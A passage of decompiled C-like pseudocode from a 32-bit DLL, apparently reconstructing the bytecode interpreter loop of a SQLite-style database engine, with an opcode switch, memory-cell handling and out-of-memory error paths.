    v8[19] = *(_DWORD *)(v6 + 20) + 88;
  if ( a5 )
  {
    v10 = (void *)(v11 + *(_DWORD *)(v6 + 20));
    *v8 = v10;
    memset(v10, 0, 0x54u);
  }
  return v8;
}

//----- (1005C78F) --------------------------------------------------------
void __usercall sub_1005C78F(int a1@<edi>)
{
  int v1; // [esp+8h] [ebp-8h] BYREF
  int v2; // [esp+Ch] [ebp-4h] BYREF

  if ( (*(_BYTE *)(a1 + 28) & 0xC) == 0 )
  {
    sub_10059E4E(a1);
    if ( (*(_BYTE *)(a1 + 28) & 2) != 0 )
    {
      if ( sub_10059441(*(_BYTE **)(a1 + 20), &v2, *(_BYTE *)(a1 + 31)) )
      {
        sub_10059D24(a1, 1);
        if ( v2 || !sub_100597DB(*(char **)(a1 + 20), &v1) )
        {
          sub_1005A17E(a1);
        }
        else
        {
          *(_DWORD *)a1 = v1;
          *(_DWORD *)(a1 + 4) = v2;
          *(_WORD *)(a1 + 28) = *(_WORD *)(a1 + 28) & 0xFF00 | 4;
        }
      }
    }
  }
}

//----- (1005C806) --------------------------------------------------------
void __usercall sub_1005C806(int a1@<eax>, char a2, unsigned __int8 a3)
{
  __int16 v4; // ax

  if ( a2 == 97 )
  {
    v4 = *(_WORD *)(a1 + 28);
    if ( (v4 & 2) == 0 && (v4 & 0xC) != 0 )
      sub_10059E94(a1, a3);
    *(_WORD *)(a1 + 28) &= 0xFFF3u;
  }
  else if ( a2 != 98 )
  {
    sub_1005C78F(a1);
    if ( (*(_BYTE *)(a1 + 28) & 8) != 0 )
      sub_1005A108(a1);
  }
}

//----- (1005C850) --------------------------------------------------------
int __cdecl sub_1005C850(unsigned int *a1)
{
  int v1; // esi
  _DWORD *v2; // ebx
  char v3; // cl
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  _DWORD *v7; // edi
  int v8; // edx
  unsigned __int8 *v9; // ebx
  int v10; // ebx
  int v11; // ecx
  __int64 v12; // rax
  int v13; // eax
  int v14; // eax
  int v15; // ebx
  int v16; // eax
  int v17; // eax
  int v18; // ecx
  int v19; // ecx
  int *v20; // eax
  int v21; // eax
  int *v22; // ebx
  int *v23; // eax
  int v24; // ecx
  int *v25; // eax
  _BYTE *v26; // ecx
  _BYTE *v27; // eax
  _BYTE *v28; // ecx
  int *v29; // edi
  int *v30; // eax
  int *v31; // eax
  int *v32; // edi
  int v33; // edx
  int v34; // ebx
  int v35; // eax
  int v36; // esi
  int *v37; // ebx
  int v38; // edi
  int v39; // esi
  int v40; // edi
  int v41; // eax
  int *v42; // esi
  int v43; // edi
  int v44; // edi
  int v45; // ecx
  int v46; // eax
  int v47; // eax
  int v48; // ecx
  int v49; // ebx
  unsigned __int8 v50; // dl
  __int16 v51; // ax
  int v52; // edi
  int v53; // edi
  int *v54; // eax
  int v55; // ecx
  int v56; // ecx
  unsigned int v57; // edi
  __int64 v58; // rax
  int v59; // edi
  unsigned __int64 v60; // kr20_8
  double v61; // st7
  double v62; // st7
  int *v63; // eax
  __int16 v64; // cx
  int v65; // edi
  int v66; // eax
  _DWORD *v67; // eax
  int *v68; // edi
  _DWORD *v69; // esi
  int v70; // eax
  int v71; // ecx
  int v72; // eax
  int v73; // edi
  char v74; // dl
  __int64 v75; // rax
  __int64 v76; // rax
  __int64 v77; // rax
  _QWORD *v78; // edi
  int v79; // edi
  __int16 v80; // ax
  int v81; // ebx
  int v82; // ebx
  __int16 v83; // ax
  int v84; // ebx
  __int16 v85; // ax
  __int16 v86; // ax
  int v87; // ebx
  int v88; // ebx
  int v89; // eax
  int v90; // ecx
  int v91; // eax
  char v92; // al
  int v93; // eax
  bool v94; // zf
  BOOL v95; // eax
  int v96; // ebx
  int v97; // edi
  int v98; // edx
  int v99; // eax
  int v100; // ecx
  int v101; // ecx
  __int64 v102; // rax
  __int64 v103; // rax
  int v104; // ecx
  __int64 v105; // rax
  int v106; // eax
  __int64 v107; // rax
  __int64 v108; // rax
  int v109; // eax
  int v110; // eax
  bool v111; // zf
  int v112; // eax
  _DWORD *v113; // eax
  int v114; // eax
  int v115; // edi
  int v116; // ecx
  int v117; // ecx
  int v118; // edx
  int v119; // ecx
  int v120; // eax
  unsigned __int8 v121; // al
  signed int v122; // ecx
  int v123; // eax
  unsigned __int8 *v124; // eax
  int v125; // ecx
  unsigned __int8 v126; // al
  unsigned int v127; // eax
  int v128; // ecx
  char *v129; // ecx
  int v130; // eax
  int v131; // eax
  _BYTE *v132; // eax
  int i; // ebx
  unsigned int v134; // eax
  int v135; // edx
  int v136; // eax
  int *v137; // edi
  _BYTE *v138; // eax
  unsigned __int8 v139; // al
  unsigned int v140; // eax
  unsigned int v141; // eax
  unsigned __int8 v142; // al
  unsigned int v143; // eax
  size_t v144; // eax
  int v145; // eax
  _DWORD *v146; // eax
  int v147; // ebx
  int v148; // eax
  int v149; // ecx
  const char *v150; // eax
  int v151; // edx
  char *v152; // eax
  int *v153; // ecx
  int v154; // edx
  int v155; // eax
  int v156; // ecx
  int v157; // eax
  int v158; // ebx
  int v159; // eax
  unsigned __int8 v160; // al
  _DWORD *v161; // edi
  unsigned __int8 v162; // al
  int v163; // ecx
  _DWORD *v164; // eax
  int v165; // eax
  int v166; // eax
  _DWORD *v167; // eax
  _DWORD *v168; // ecx
  _DWORD *v169; // eax
  int v170; // eax
  int v171; // esi
  __int64 v172; // rax
  __int16 v173; // ax
  int v174; // eax
  int v175; // eax
  int v176; // eax
  int v177; // eax
  int v178; // edx
  int v179; // edi
  int *v180; // edi
  int v181; // eax
  __int16 v182; // cx
  _DWORD *v183; // eax
  int v184; // eax
  int v185; // edi
  _QWORD *v186; // edi
  int v187; // edi
  int *v188; // eax
  int v189; // edx
  int v190; // eax
  int *v191; // edx
  int v192; // eax
  int v193; // edi
  _BYTE *v194; // eax
  int v195; // edi
  int v196; // eax
  int v197; // ebx
  __int64 v198; // kr18_8
  int v199; // eax
  int v200; // ecx
  int v201; // eax
  int v202; // ecx
  int v203; // eax
  int v204; // edx
  int v205; // eax
  int v206; // eax
  void (__cdecl *v207)(_DWORD, int, _DWORD, int, _DWORD, _DWORD); // edx
  int v208; // ecx
  int v209; // eax
  int v210; // ecx
  __int64 v211; // rax
  unsigned int v212; // eax
  int v213; // edi
  int v214; // eax
  int v215; // eax
  int v216; // eax
  _DWORD *v217; // edx
  int v218; // eax
  int v219; // eax
  int v220; // edi
  int v221; // eax
  int v222; // eax
  int v223; // edi
  int v224; // eax
  int v225; // edx
  int v226; // eax
  int v227; // eax
  unsigned __int8 v228; // bl
  _DWORD *v229; // edi
  int v230; // eax
  int v231; // edx
  int *v232; // eax
  int v233; // edx
  int *v234; // eax
  int *v235; // eax
  int v236; // eax
  int j; // edi
  int v238; // edi
  int *v239; // ecx
  int v240; // edi
  int v241; // edi
  int v242; // ebx
  int v243; // eax
  _DWORD *k; // ecx
  int v245; // edx
  _DWORD *m; // eax
  int v247; // ecx
  int v248; // eax
  int v249; // ecx
  __int64 v250; // rax
  int v251; // ecx
  _QWORD *v252; // ecx
  _DWORD *v253; // esi
  _BYTE *v254; // ecx
  int v255; // ebx
  _BYTE *v256; // eax
  unsigned __int8 *v257; // ecx
  int *v258; // eax
  int v259; // esi
  int v260; // edi
  int v261; // eax
  _DWORD *v262; // esi
  __int64 v263; // rax
  bool v264; // cf
  int v265; // edi
  __int64 *v266; // ebx
  int v267; // edi
  int v268; // eax
  _QWORD *v269; // ecx
  int v270; // ecx
  int v271; // eax
  int v272; // edi
  int v273; // ebx
  int v274; // edi
  char v275; // bl
  int v276; // eax
  int v277; // edx
  int v278; // ebx
  int v279; // eax
  int v280; // ecx
  int v281; // eax
  int v282; // edx
  int *v283; // ecx
  int v284; // eax
  int v285; // edx
  int v286; // eax
  __int64 *v287; // ebx
  __int64 v288; // rcx
  int v289; // eax
  _DWORD *v290; // ecx
  __int64 v291; // rax
  int v292; // eax
  int v293; // edx
  const char *v294; // eax
  const char *v295; // eax
  int v296; // eax
  int v297; // edi
  int v299; // ebx
  char v300; // al
  int v301; // eax
  int v302; // eax
  int v303; // eax
  int v304; // eax
  _DWORD *v305; // eax
  int v306; // edi
  _DWORD *v307; // edx
  int v308; // eax
  int v309; // eax
  int v310; // eax
  int v311; // eax
  int v312; // edi
  int v313; // eax
  int v314; // eax
  int v315; // eax
  int v316; // ecx
  int v317; // eax
  int v318; // eax
  int v319; // eax
  int v320; // eax
  int v321; // eax
  int v322; // eax
  int v323; // ebx
  int v324; // ecx
  unsigned int v325; // [esp-Ch] [ebp-158h]
  unsigned int v326; // [esp-4h] [ebp-150h]
  unsigned int v327; // [esp-4h] [ebp-150h]
  unsigned int v328; // [esp-4h] [ebp-150h]
  int v329; // [esp+0h] [ebp-14Ch]
  _DWORD *v330; // [esp+0h] [ebp-14Ch]
  _DWORD *v331; // [esp+0h] [ebp-14Ch]
  unsigned __int8 v332; // [esp+4h] [ebp-148h]
  int v333; // [esp+4h] [ebp-148h]
  unsigned int v334; // [esp+4h] [ebp-148h]
  unsigned int v335; // [esp+4h] [ebp-148h]
  unsigned int v336; // [esp+4h] [ebp-148h]
  char *v337; // [esp+4h] [ebp-148h]
  char *v338; // [esp+4h] [ebp-148h]
  BOOL v339; // [esp+3Ch] [ebp-110h]
  int v340; // [esp+40h] [ebp-10Ch] BYREF
  int v341; // [esp+44h] [ebp-108h]
  int v342; // [esp+48h] [ebp-104h]
  int v343; // [esp+4Ch] [ebp-100h]
  int v344; // [esp+50h] [ebp-FCh]
  int v345; // [esp+54h] [ebp-F8h]
  int v346; // [esp+58h] [ebp-F4h]
  char v347; // [esp+5Fh] [ebp-EDh]
  int v348; // [esp+60h] [ebp-ECh]
  unsigned __int8 *v349; // [esp+64h] [ebp-E8h]
  int v350; // [esp+68h] [ebp-E4h]
  int v351; // [esp+6Ch] [ebp-E0h]
  __int128 v352; // [esp+70h] [ebp-DCh] BYREF
  _BYTE v353[88]; // [esp+80h] [ebp-CCh] BYREF
  unsigned __int8 *v354; // [esp+D8h] [ebp-74h]
  unsigned __int8 *v355; // [esp+DCh] [ebp-70h]
  unsigned int v356; // [esp+E0h] [ebp-6Ch] BYREF
  unsigned __int64 v357; // [esp+E8h] [ebp-64h]
  int v358; // [esp+F0h] [ebp-5Ch]
  unsigned int v359; // [esp+F4h] [ebp-58h] BYREF
  int v360; // [esp+F8h] [ebp-54h]
  int v361; // [esp+134h] [ebp-18h]
  int v362; // [esp+138h] [ebp-14h]
  int *v363; // [esp+13Ch] [ebp-10h]
  _DWORD *v364; // [esp+140h] [ebp-Ch]
  int v365; // [esp+144h] [ebp-8h]

  v1 = (int)a1;
  v2 = (_DWORD *)*a1;
  v3 = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*a1 + 8) + 12) + 73);
  v342 = a1[5];
  LOBYTE(v351) = v3;
  v4 = a1[19];
  v365 = 0;
  v364 = v2;
  v347 = 0;
  v343 = 0;
  v361 = v4;
  v363 = 0;
  v345 = 0;
  v341 = 0;
  sub_1005B9E2((int)a1);
  if ( a1[22] == 7 )
    goto LABEL_828;
  a1[22] = 0;
  a1[11] = 0;
  v5 = v2[54];
  v2[102] = 0;
  if ( v5 )
  {
LABEL_846:
    v365 = 9;
    *(_DWORD *)(v1 + 88) = 9;
    v338 = sub_10053FC9(9u);
    sub_10059206((unsigned int *)(v1 + 92), (int)v2, aS_4, v338);
    goto LABEL_769;
  }
  v94 = v2[62] == 0;
  v362 = a1[21];
  v339 = !v94;
  v6 = 0;
  while ( 1 )
  {
    v7 = v364;
    v8 = v361;
    if ( *((_BYTE *)v364 + 30) )
      goto LABEL_828;
    v9 = (unsigned __int8 *)(v342 + 20 * v362);
    v349 = v9;
    if ( v339 )
    {
      if ( v364[64] == v343 )
      {
        if ( ((int (__cdecl *)(_DWORD))v364[62])(v364[63]) )
        {
          v365 = 9;
          goto LABEL_769;
        }
        v343 = 0;
        v8 = v361;
        v6 = 0;
      }
      ++v343;
    }
    if ( (v9[2] & 2) != 0 )
    {
      v363 = (int *)(v361 + 40 * *((_DWORD *)v9 + 2));
      sub_10059F6C(v363);
      v8 = v361;
      *((_WORD *)v363 + 14) = 4;
      v6 = 0;
    }
    switch ( *v9 )
    {
      case 1u:
        if ( v7[54] )
          goto LABEL_845;
        goto LABEL_14;
      case 2u:
        v11 = v8 + 40 * *((_DWORD *)v9 + 1);
        v12 = v362;
        *(_WORD *)(v11 + 28) = 4;
        *(_QWORD *)v11 = v12;
        v13 = *((_DWORD *)v9 + 2);
        goto LABEL_17;
      case 3u:
        v14 = *(_DWORD *)(40 * *((_DWORD *)v9 + 1) + v8);
        goto LABEL_18;
      case 4u:
        v15 = v8 + 40 * *((_DWORD *)v9 + 1);
        v16 = *(_DWORD *)v15;
        *(_WORD *)(v15 + 28) = 4;
        LODWORD(v352) = v16;
        *(_QWORD *)v15 = v362;
        v14 = v352;
        goto LABEL_18;
      case 5u:
        if ( (*(_BYTE *)(40 * *((_DWORD *)v9 + 3) + v8 + 28) & 1) != 0 )
          goto LABEL_22;
        goto LABEL_58;
      case 6u:
LABEL_22:
        if ( *((_DWORD *)v9 + 1) || (v17 = *(_DWORD *)(v1 + 204)) == 0 )
        {
          *(_DWORD *)(v1 + 88) = *((_DWORD *)v9 + 1);
          *(_BYTE *)(v1 + 56) = v9[8];
          *(_DWORD *)(v1 + 84) = v362;
          v323 = *((_DWORD *)v9 + 4);
          if ( v323 )
            sub_10059206((unsigned int *)(v1 + 92), (int)v7, aS_22, v323);
          if ( sub_1005BA6D(v1) != 5 )
          {
            v365 = *(_DWORD *)(v1 + 88) != 0 ? 1 : 101;
            goto LABEL_773;
          }
LABEL_830:
          v365 = 5;
          *(_DWORD *)(v1 + 88) = 5;
          goto LABEL_773;
        }
        v18 = *(_DWORD *)(v17 + 60);
        --*(_DWORD *)(v1 + 208);
        *(_DWORD *)(v1 + 204) = v18;
        v19 = *(_DWORD *)(v1 + 104);
        v7[16] += v19;
        v7[15] = v19;
        v20 = sub_1005B409((int **)v17);
        v94 = *((_DWORD *)v9 + 2) == 4;
        v362 = (int)v20;
        if ( v94 )
          v362 = *(_DWORD *)(20 * (_DWORD)v20 + *(_DWORD *)(v1 + 20) + 8) - 1;
        v342 = *(_DWORD *)(v1 + 20);
        v361 = *(_DWORD *)(v1 + 76);
        goto LABEL_58;
      case 7u:
        v21 = *((_DWORD *)v9 + 1);
        goto LABEL_28;
      case 8u:
        v22 = (int *)*((_DWORD *)v9 + 4);
        v23 = v363;
        *v363 = *v22;
        v24 = v22[1];
        goto LABEL_30;
      case 9u:
        goto LABEL_39;
      case 0xAu:
        goto LABEL_40;
      case 0xBu:
        v32 = v363;
        sub_1005A3FE(0, (int)v363, *((_DWORD *)v9 + 1), *((_BYTE **)v9 + 4), 0);
        *((_BYTE *)v32 + 31) = v351;
        goto LABEL_58;
      case 0xCu:
        v33 = *((_DWORD *)v9 + 1) - 1;
        LODWORD(v352) = v33;
        DWORD1(v352) = *((_DWORD *)v9 + 2);
        v34 = *((_DWORD *)v9 + 3);
        if ( v34 <= 0 )
          goto LABEL_47;
        while ( 2 )
        {
          v35 = *(_DWORD *)(v1 + 60) + 40 * v33;
          DWORD2(v352) = v34 - 1;
          HIDWORD(v352) = v35;
          LODWORD(v352) = v33 + 1;
          if ( sub_1005A33C(v35) )
            goto LABEL_768;
          v36 = v361 + 40 * DWORD1(v352)++;
          v363 = (int *)v36;
          sub_10059F6C((int *)v36);
          *(_WORD *)(v36 + 28) = 1;
          sub_1005A356(SHIDWORD(v352), v36, 2048);
          v34 = DWORD2(v352);
          v1 = (int)a1;
          if ( SDWORD2(v352) > 0 )
          {
            v33 = v352;
            continue;
          }
          break;
        }
LABEL_47:
        DWORD2(v352) = v34 - 1;
        goto LABEL_58;
      case 0xDu:
        DWORD1(v352) = *((_DWORD *)v9 + 3);
        *((_QWORD *)&v352 + 1) = *(_QWORD *)(v9 + 4);
        v37 = (int *)(v8 + 40 * HIDWORD(v352));
        v38 = v8 + 40 * DWORD2(v352);
        v363 = v37;
        if ( DWORD1(v352) )
        {
          do
          {
            --DWORD1(v352);
            LODWORD(v352) = v37[9];
            v37[9] = 0;
            sub_1005A3D5(v38, v37);
            *(_DWORD *)(v38 + 36) = v352;
            v38 += 40;
            v37 += 10;
          }
          while ( DWORD1(v352) );
          v1 = (int)a1;
          v363 = v37;
        }
        --DWORD1(v352);
        goto LABEL_58;
      case 0xEu:
        v39 = v361 + 40 * *((_DWORD *)v9 + 2);
        v40 = v361 + 40 * *((_DWORD *)v9 + 1);
        v363 = (int *)v39;
        sub_1005A356(v40, v39, 4096);
        if ( (*(_WORD *)(v39 + 28) & 0x1000) == 0 )
          goto LABEL_57;
        v41 = sub_10059E08(v39);
        v1 = (int)a1;
        if ( !v41 )
          goto LABEL_58;
        goto LABEL_828;
      case 0xFu:
        v42 = (int *)(v361 + 40 * *((_DWORD *)v9 + 2));
        v43 = v361 + 40 * *((_DWORD *)v9 + 1);
        v363 = v42;
        goto LABEL_56;
      case 0x10u:
        v365 = sub_1005BA17(v1, 0);
        if ( v365 )
          goto LABEL_58;
        v365 = sub_1005B91A((_DWORD *)v1, 1);
        if ( v365 )
          goto LABEL_58;
        v44 = (int)v349;
        v45 = v361;
        *(_DWORD *)(v1 + 80) = (*(_DWORD *)(v1 + 80) + 2) | 1;
        v46 = v45 + 40 * *(_DWORD *)(v44 + 4);
        *(_DWORD *)(v1 + 44) = v46;
        *(_QWORD *)&v352 = (unsigned int)v46;
        if ( *(int *)(v44 + 8) > 0 )
        {
          do
          {
            sub_10059E4E(v352 + 40 * DWORD1(v352));
            sub_1005C69B(v352 + 40 * DWORD1(v352));
            ++DWORD1(v352);
          }
          while ( SDWORD1(v352) < *(_DWORD *)(v44 + 8) );
        }
        if ( *((_BYTE *)v364 + 30) )
          goto LABEL_828;
        *(_DWORD *)(v1 + 84) = v362 + 1;
        v365 = 100;
        goto LABEL_773;
      case 0x12u:
        v65 = v9[3];
        *(_DWORD *)&v353[56] = *(_DWORD *)(v1 + 36);
        *(_DWORD *)&v353[60] = v65;
        v66 = v8 + 40 * *((_DWORD *)v9 + 2);
        DWORD1(v352) = v66;
        LODWORD(v352) = 0;
        if ( v65 > 0 )
        {
          do
          {
            *(_DWORD *)(*(_DWORD *)&v353[56] + 4 * v352) = v66;
            sub_1005C69B(SDWORD1(v352));
            LODWORD(v352) = v352 + 1;
            v66 = DWORD1(v352) + 40;
            DWORD1(v352) += 40;
          }
          while ( (int)v352 < *(int *)&v353[60] );
        }
        v67 = (_DWORD *)*((_DWORD *)v9 + 4);
        if ( v9[1] == 0xFB )
        {
          HIDWORD(v352) = 0;
        }
        else
        {
          HIDWORD(v352) = *((_DWORD *)v9 + 4);
          v67 = (_DWORD *)*v67;
        }
        DWORD2(v352) = v67;
        v68 = (int *)(v361 + 40 * *((_DWORD *)v9 + 3));
        *(_QWORD *)&v353[32] = 0i64;
        *(_DWORD *)&v353[16] = v364;
        v363 = v68;
        *(_WORD *)&v353[28] = 1;
        sub_1005A3D5((int)v68, (int *)v353);
        *(_DWORD *)&v353[44] = 0;
        *(_WORD *)&v353[28] = *(_WORD *)&v353[28] & 0xFF00 | 1;
        if ( (*(_BYTE *)(DWORD2(v352) + 3) & 8) != 0 )
          *(_DWORD *)&v353[48] = *((_DWORD *)v9 - 1);
        (*(void (__cdecl **)(char *, _DWORD, _DWORD))(DWORD2(v352) + 12))(
          (char *)&v352 + 8,
          *(_DWORD *)&v353[60],
          *(_DWORD *)&v353[56]);
        v69 = v364;
        if ( !*((_BYTE *)v364 + 30) )
        {
          if ( HIDWORD(v352) )
          {
            sub_1005BD8A(SHIDWORD(v352), *((_DWORD *)v9 + 1));
            v68 = v363;
            *((_DWORD *)v9 + 4) = HIDWORD(v352);
            v9[1] = -7;
          }
          if ( *(_DWORD *)&v353[44] )
          {
            v70 = sub_100530C6((int)v353);
            sub_10059206(a1 + 23, (int)v69, aS_23, v70);
            v68 = v363;
            v365 = *(_DWORD *)&v353[44];
          }
          sub_10059D24((int)v353, (unsigned __int8)v351);
          sub_1005A3D5((int)v353, v68);
          v1 = (int)a1;
          if ( sub_1005A33C((int)v68) )
          {
LABEL_768:
            sub_10059206((unsigned int *)(v1 + 92), (int)v364, aStringOrBlobTo_0);
            v365 = 18;
            goto LABEL_769;
          }
          goto LABEL_58;
        }
        sub_10059FC7((int *)v353);
LABEL_827:
        v1 = (int)a1;
LABEL_828:
        v331 = v364;
        *((_BYTE *)v364 + 30) = 1;
        sub_10059206((unsigned int *)(v1 + 92), (int)v331, aOutOfMemory_0);
        v365 = 7;
LABEL_769:
        v297 = v365;
        *(_DWORD *)(v1 + 88) = v365;
        sub_1005BA6D(v1);
        if ( v297 == 3082 )
          *((_BYTE *)v364 + 30) = 1;
        v365 = 1;
        if ( v347 )
          sub_1006A029(0, v364);
LABEL_773:
        sub_10068DD3((int *)(v1 + 120));
        return v365;
      case 0x13u:
        v106 = v8 + 40 * *((_DWORD *)v9 + 1);
        v49 = v8 + 40 * *((_DWORD *)v9 + 2);
        v94 = (*(_BYTE *)(v106 + 28) & 1) == 0;
        v363 = (int *)v49;
        if ( !v94 )
          goto LABEL_67;
        LODWORD(v107) = sub_1005A03A(v106);
        v108 = v107 == 0;
        goto LABEL_219;
      case 0x14u:
        v78 = (_QWORD *)(v361 + 40 * *((_DWORD *)v9 + 1));
        sub_1005A15D((int)v78);
        *v78 += *((int *)v9 + 2);
        goto LABEL_58;
      case 0x15u:
        v79 = v361 + 40 * *((_DWORD *)v9 + 1);
        sub_1005C806(v79, 99, v351);
        v80 = *(_WORD *)(v79 + 28);
        if ( (v80 & 4) != 0 )
        {
          *(_WORD *)(v79 + 28) = v80 & 0xFF00 | 4;
          goto LABEL_58;
        }
        v10 = *((_DWORD *)v9 + 2);
        if ( !v10 )
        {
          v365 = 20;
          goto LABEL_841;
        }
        goto LABEL_15;
      case 0x16u:
        v81 = v8 + 40 * *((_DWORD *)v9 + 1);
        if ( (*(_BYTE *)(v81 + 28) & 4) != 0 )
          goto LABEL_150;
        goto LABEL_58;
      case 0x17u:
        v341 = *((_DWORD *)v9 + 4);
        goto LABEL_58;
      case 0x18u:
        v97 = *((_DWORD *)v9 + 3);
        *(_QWORD *)&v352 = (unsigned int)v97;
        v98 = *((_DWORD *)v9 + 4);
        *(_DWORD *)v353 = v98;
        *((_QWORD *)&v352 + 1) = *(_QWORD *)(v9 + 4);
        v99 = 0;
        if ( v97 <= 0 )
          goto LABEL_201;
        while ( 2 )
        {
          if ( v341 )
            v100 = *(_DWORD *)(v341 + 4 * v99);
          else
            v100 = v99;
          *(_DWORD *)&v353[4] = v100;
          *(_DWORD *)&v353[8] = *(_DWORD *)(v98 + 4 * v99 + 12);
          *(_DWORD *)&v353[12] = *(unsigned __int8 *)(*(_DWORD *)(v98 + 8) + v99);
          v345 = sub_1005A556(v361 + 40 * (v100 + DWORD2(v352)), *(int *)&v353[8], v361 + 40 * (v100 + HIDWORD(v352)));
          if ( v345 )
          {
            if ( *(_DWORD *)&v353[12] )
              v345 = -v345;
          }
          else
          {
            v99 = ++DWORD1(v352);
            if ( SDWORD1(v352) < (int)v352 )
            {
              v98 = *(_DWORD *)v353;
              continue;
            }
          }
          break;
        }
LABEL_201:
        v341 = 0;
        goto LABEL_58;
      case 0x19u:
        if ( v345 < 0 )
        {
          v10 = *((_DWORD *)v9 + 1);
          goto LABEL_15;
        }
        if ( !v345 )
          goto LABEL_14;
        v10 = *((_DWORD *)v9 + 3);
        goto LABEL_15;
      case 0x1Au:
      case 0x1Bu:
        if ( (*(_BYTE *)(v8 + 40 * *((_DWORD *)v9 + 1) + 28) & 1) != 0 )
        {
          v110 = *((_DWORD *)v9 + 3);
LABEL_224:
          LODWORD(v352) = v110;
          goto LABEL_225;
        }
        LODWORD(v352) = sub_1005A0AF(v8 + 40 * *((_DWORD *)v9 + 1)) != 0.0;
        v1 = (int)a1;
        if ( *v9 == 27 )
        {
          v110 = v352 == 0;
          goto LABEL_224;
        }
LABEL_225:
        v94 = (_DWORD)v352 == 0;
LABEL_171:
        if ( !v94 )
          goto LABEL_14;
LABEL_58:
        ++v362;
        v6 = 0;
        if ( v365 )
          goto LABEL_769;
        break;
      case 0x1Cu:
        *(_DWORD *)v353 = *((_DWORD *)v9 + 1);
        v112 = *((_DWORD *)v9 + 2);
        *(_DWORD *)&v353[8] = 0;
        *(_DWORD *)&v353[4] = v112;
        memset(&v353[48], 0, 0x28u);
        *(_DWORD *)&v353[44] = v361 + 40 * *((_DWORD *)v9 + 3);
        *(_WORD *)(*(_DWORD *)&v353[44] + 28) = *(_WORD *)(*(_DWORD *)&v353[44] + 28) & 0xFF00 | 1;
        v113 = *(_DWORD **)(*(_DWORD *)(v1 + 52) + 4 * *(_DWORD *)v353);
        *(_QWORD *)&v353[8] = (unsigned int)v113;
        *(_DWORD *)&v353[16] = *v113;
        if ( *(_DWORD *)&v353[16] )
        {
          v365 = sub_1005BE63((int)v113);
          if ( v365 )
            goto LABEL_841;
          v113 = *(_DWORD **)&v353[8];
          if ( *(_BYTE *)(*(_DWORD *)&v353[8] + 20) )
          {
            LODWORD(v352) = 0;
            goto LABEL_58;
          }
          if ( *(_DWORD *)(*(_DWORD *)&v353[8] + 68) == *(_DWORD *)(v1 + 80) )
          {
            LODWORD(v352) = *(_DWORD *)(*(_DWORD *)&v353[8] + 72);
            *(_DWORD *)&v353[12] = *(_DWORD *)(*(_DWORD *)&v353[8] + 84);
          }
          else
          {
            if ( *(_BYTE *)(*(_DWORD *)&v353[8] + 23) )
            {
              v365 = sub_10063501(*(int *)&v353[16], (_DWORD *)&v352 + 2);
              v114 = DWORD2(v352);
            }
            else
            {
              v115 = *(_DWORD *)&v353[16];
              sub_100634DB(*(int *)&v353[16]);
              v114 = *(_DWORD *)(v115 + 48);
              v365 = 0;
              v1 = (int)a1;
            }
            LODWORD(v352) = v114;
            v113 = *(_DWORD **)&v353[8];
          }
          v7 = v364;
        }
        else
        {
          v116 = v113[9];
          if ( v116 <= 0 )
          {
            LODWORD(v352) = 0;
          }
          else
          {
            v360 = v361 + 40 * v116;
            LODWORD(v352) = *(_DWORD *)(v360 + 24);
            *(_DWORD *)&v353[12] = *(_DWORD *)(v360 + 20);
            if ( (v9[3] & 0x20) != 0 )
              v117 = 0;
            else
              v117 = *(_DWORD *)(v1 + 80);
            v113[17] = v117;
            v113 = *(_DWORD **)&v353[8];
          }
        }
        if ( !(_DWORD)v352 )
          goto LABEL_58;
        if ( (unsigned int)v352 > v7[18] )
          goto LABEL_768;
        v118 = v113[11];
        *(_DWORD *)&v353[28] = v118;
        v119 = v113[19];
        *(_DWORD *)&v353[20] = v119;
        if ( v113[17] == *(_DWORD *)(v1 + 80) )
        {
          *(_DWORD *)&v353[24] = v113[20];
          goto LABEL_290;
        }
        v359 = 0;
        *(_DWORD *)&v353[24] = v119 + 4 * v118;
        v113[20] = *(_DWORD *)&v353[24];
        *(_DWORD *)(*(_DWORD *)&v353[8] + 72) = v352;
        *(_DWORD *)(*(_DWORD *)&v353[8] + 68) = *(_DWORD *)(v1 + 80);
        if ( *(_DWORD *)&v353[12] )
        {
          *(_DWORD *)&v353[40] = *(_DWORD *)&v353[12];
          goto LABEL_264;
        }
        if ( *(_BYTE *)(*(_DWORD *)&v353[8] + 23) )
        {
          v120 = 0;
          if ( *(_BYTE *)(*(_DWORD *)&v353[16] + 67) != 1 )
            goto LABEL_261;
          v120 = sub_100637A4(*(int *)&v353[16], &v359, 0);
        }
        else
        {
          v120 = 0;
          if ( *(_BYTE *)(*(_DWORD *)&v353[16] + 67) != 1 )
            goto LABEL_261;
          v120 = sub_100637A4(*(int *)&v353[16], &v359, 1);
        }
        v1 = (int)a1;
LABEL_261:
        *(_DWORD *)&v353[40] = v120;
        if ( (unsigned int)v352 > v359 )
        {
          *(_DWORD *)(*(_DWORD *)&v353[8] + 84) = 0;
        }
        else
        {
          *(_DWORD *)&v353[12] = v120;
          *(_DWORD *)(*(_DWORD *)&v353[8] + 84) = v120;
        }
LABEL_264:
        if ( **(_BYTE **)&v353[40] >= 0x80u )
        {
          v121 = sub_10059BD0(*(unsigned __int8 **)&v353[40], (int *)&v356);
        }
        else
        {
          v356 = (unsigned __int8)**(_BYTE **)&v353[40];
          v121 = 1;
        }
        v358 = v121;
        if ( v356 > 0x18003 )
          goto LABEL_302;
        v122 = 5 * *(_DWORD *)&v353[28] + 3;
        *(_DWORD *)&v353[32] = v122;
        if ( v122 > (int)v356 )
        {
          v122 = v356;
          *(_DWORD *)&v353[32] = v356;
        }
        if ( *(_DWORD *)&v353[12] || (int)v359 >= v122 )
        {
          v123 = *(_DWORD *)&v353[40];
        }
        else
        {
          *(_WORD *)&v353[76] = 0;
          *(_DWORD *)&v353[64] = 0;
          v365 = sub_1005A70D(
                   (int)&v353[48],
                   *(int *)&v353[16],
                   v122,
                   0,
                   *(unsigned __int8 *)(*(_DWORD *)&v353[8] + 23));
          if ( v365 )
            goto LABEL_58;
          v123 = *(_DWORD *)&v353[68];
          v122 = *(_DWORD *)&v353[32];
          v9 = v349;
          *(_DWORD *)&v353[40] = *(_DWORD *)&v353[68];
        }
        v355 = (unsigned __int8 *)(v123 + v122);
        v124 = (unsigned __int8 *)(v358 + v123);
        v357 = v356;
        v125 = 0;
        v354 = v124;
        *(_DWORD *)&v353[36] = 0;
        if ( *(int *)&v353[28] > 0 )
        {
          while ( 1 )
          {
            if ( v124 >= v355 )
            {
              *(_DWORD *)(*(_DWORD *)&v353[24] + 4 * v125) = 0;
              v128 = *(_DWORD *)&v353[36];
            }
            else
            {
              *(_DWORD *)(*(_DWORD *)&v353[24] + 4 * v125) = v357;
              if ( *v354 >= 0x80u )
              {
